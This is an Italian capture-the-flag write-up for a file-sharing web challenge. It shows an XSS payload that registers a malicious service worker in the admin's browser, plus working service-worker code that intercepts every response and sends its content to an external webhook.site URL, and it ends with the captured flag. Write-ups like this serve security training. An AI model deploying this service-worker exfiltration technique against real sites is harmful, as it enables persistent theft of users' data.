> Our new startup developed a new web app with amazing features you've never heard of.
> Website: http://filesharing.challs.olicyber.it

L'XSS in /play può essere utilizzato per eseguire uno script da un file condiviso con l'amministratore (consentito dal CSP), viene usato per registrare un service worker nel browser dell'admin; 

```html
<script>
navigator.serviceWorker.register('https://filesharing.m0lec.one/upload/e81c51506d9b4e4ca5d609ed0f6e4fe3');
window.setTimeout(()=>document.location = 'https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff',500);
</script>
```
Scriviamo un service worker in JS per rubare i dati all'admin. Intercettiamo tutte le richieste fetch del browser, per ogni richiesta, salviamo la risposta nella cache e la restituiamo normalmente; cloniamo le risposte e ne estraiamo il testo; inviamo il contenuto della risposta (es. flag) a un webhook esterno (webhook.site) permettendo di ricevere i dati rubati.
Dunque, se l'admin visita la pagina con questo service worker attivo, ogni volta che scarica un file (es. flag) suddetto contenuto viene esfiltrato dall'attaccante (noi).

Un esempio di service worker per avere la flag è:

```javascript
// Per usarlo come service worker, dovresti collegare fetchHandler all'evento fetch:
// self.onfetch = fetchHandler;

function fetchHandler(e) {
  e.respondWith(
    caches.match(e.request).then((r) => {
      return r || fetch(e.request).then((response) => {
        console.log(response);
        console.log(new Map(response.headers));
        const newHeaders = new Headers();
        const anotherResponse = new Response(response.body, {
          status: response.status,
          statusText: response.statusText,
          headers: newHeaders
        });
        let clone = anotherResponse.clone();
        clone.text().then((x)=>fetch('https://webhook.site/9cf73d0f-160a-4f23-a986-70f1bc21b864/'+x).then((r)=>console.log(r)));
        console.log(new Map(anotherResponse.headers));
        return caches.open('static').then(
          (cache) => {
            cache.put(e.request, anotherResponse.clone());
            return anotherResponse;
          }
        );
      });
    })
  );
}
```

Ma ci sono altri modi.

**ptm{H0w_d0_U_r3ad_4_d0wnlo4d3d_fil3?}**